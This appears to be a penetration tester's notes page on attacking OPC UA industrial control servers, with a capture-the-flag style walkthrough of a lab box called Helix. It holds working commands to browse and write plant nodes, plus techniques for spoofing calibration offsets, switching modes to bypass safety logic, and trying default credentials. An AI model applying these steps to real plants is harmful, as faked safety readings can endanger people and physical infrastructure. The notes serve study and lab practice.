## What is it

OPC UA (Open Platform Communications — Unified Architecture) is a protocol used in **ICS / OT environments** — factories, power plants, water treatment, manufacturing lines, oil rigs. It's how SCADA software talks to physical machinery (PLCs, sensors, actuators).

Instead of HTTP-style request/response, OPC UA exposes a **tree of nodes** that clients browse, read, and write — like a filesystem where each "file" is a live variable (`Temperature = 72.5`, `PumpRunning = true`, `Mode = "Manual"`).

Default port: **4840**. URL scheme: `opc.tcp://host:port/endpoint`.

## What it does

- **Browses** the address space — clients walk the node tree from the root
- **Reads / writes** node values (if the node is writable and the auth allows it)
- **Subscribes** to value changes (push notifications)
- **Calls methods** on nodes (RPC-style)
- Supports multiple **security modes**: None (plaintext), Sign (integrity), Sign & Encrypt (full crypto)
- Supports multiple **user policies** per endpoint: anonymous, username/password, x509 certificate
- Each node has a `NodeId` like `ns=2;i=15` (namespace, numeric ID) or `ns=2;s=Reactor.Temp` (string ID). Namespace 0 is OPC UA standard boilerplate; namespace ≥ 2 is custom server content (= the juicy stuff)

## Common Attacks

1. **Anonymous + Security Mode None** — Server accepts unauthenticated clients with no encryption, exposing read/write on all nodes that aren't explicitly ACL'd. Extremely common misconfig in real-world ICS ("it's on the internal network, why bother"). Full control with zero creds.
2. **Process variable manipulation** — Even when "safety" nodes are read-only, "control" or "calibration" nodes are often writable. Pushing process variables (temperature, pressure, calibration offsets) outside normal ranges can trigger unsafe states OR unlock privileged states (maintenance mode, diagnostic shells).
3. **Calibration / offset spoofing** — Servers often expose a raw sensor value AND a "calibrated" value used by downstream safety logic. Writing to the calibration offset fakes the value the safety system sees, without changing the real sensor reading. Bypasses physics-based safety in software.
4. **Mode switching** — Many systems expose a `Mode` node (NORMAL / MAINTENANCE / TEST). Switching modes can unlock writable nodes, disable safety checks, or trigger downstream services to grant elevated access (e.g. write a "maintenance window open" timestamp).
5. **Credential exposure via username policy** — When `username` is offered but accepts default/weak creds, expect things like `operator:operator`, `admin:admin`, or creds left in `.json`/`.yaml` config files on the host.

## Detection

- **Port 4840 open** (TCP). That's the dead giveaway.
- Often **bound to localhost** on hardened-ish boxes — won't show up in external nmap. Look for it after you have an initial shell, with `ss -tlnp` / `netstat -tlnp`.
- Architecture diagrams, "Plant Operator" terminology, references to PLCs, SCADA, HMI, "control room"
- `freeopcua` Python library running as a service (very common in HTB-style ICS sims) → `ps aux | grep -i opc`
- HMI dashboards on adjacent ports (8080, 8081, etc.) talking to the OPC UA server in the backend
- `urn:freeopcua:...` strings in service responses

## Payloads/reckon/crack

**Install the client:**

```bash
pip3 install opcua --break-system-packages
# gives CLI tools: uadiscover, uals, uaread, uawrite, uahistoryread, uaclient, uacall
```

**Port forward if it's localhost-only:**

```bash
ssh -i key -L 4840:127.0.0.1:4840 user@target
```

**Discover endpoints and supported auth (no creds needed):**

```bash
uadiscover opc.tcp://localhost:4840
```

Watch for `Security Mode: 1` (= None) and `User policy: anonymous` — that's a free door.

**Browse the address space:**

```bash
# Start at root (i=84), depth 3
uals -u opc.tcp://localhost:4840/<endpoint>/ -l 3

# Drill into Objects (i=85) — where actual content lives
uals -u opc.tcp://localhost:4840/<endpoint>/ -n i=85 -l 4

# Drill into custom namespace 2 — where the juicy stuff is
uals -u opc.tcp://localhost:4840/<endpoint>/ -n "ns=2;i=1" -l 5
```

> Quote NodeIds in bash because of the `;` — otherwise bash treats it as a command separator.

**Read a node:**

```bash
uaread -u opc.tcp://localhost:4840/<endpoint>/ -n "ns=2;i=4"
```

**Write a node:**

```bash
uawrite -u opc.tcp://localhost:4840/<endpoint>/ -n "ns=2;i=12" -t string MAINTENANCE
uawrite -u opc.tcp://localhost:4840/<endpoint>/ -n "ns=2;i=13" -t bool True
uawrite -u opc.tcp://localhost:4840/<endpoint>/ -n "ns=2;i=6" -t double 12.0
```

> `uawrite` types are **case-sensitive lowercase**: `double`, `bool`, `string`, `int32`, `float`, etc. `Double` and `Boolean` will error.

**Authenticated (username/password):**

```bash
uals -u opc.tcp://localhost:4840/<endpoint>/ --user operator --password <pw> -n "ns=2;i=1" -l 5
```

**Common NodeId types you'll see in `uals` output:**

|DataType column|Meaning|
|---|---|
|`i=1`|Boolean|
|`i=11`|Double (float)|
|`i=12`|String|
|`i=6`, `i=7`, `i=8`|Int32 / UInt32 / Int64|

**Real example ([[Helix]]):**

- OPC UA server on localhost:4840, Security Mode None, anonymous allowed → full read/write with no creds
- Browsed namespace 2 (`Plant`) → found Reactor/Safety/Control groups with writable calibration and mode nodes
- `Temperature = TemperatureRaw + CalibrationOffset` (calibration just additively fakes the value)
- Wrote `Mode → MAINTENANCE`, `TestOverride → True`, `CalibrationOffset → 12.0` to push fake temperature into the maintenance window
- `helix-safety` (root process) detected the window conditions and wrote a future timestamp to `/opt/helix/state/maintenance_window`
- `sudo helix-maint-console` checked that timestamp and dropped a root shell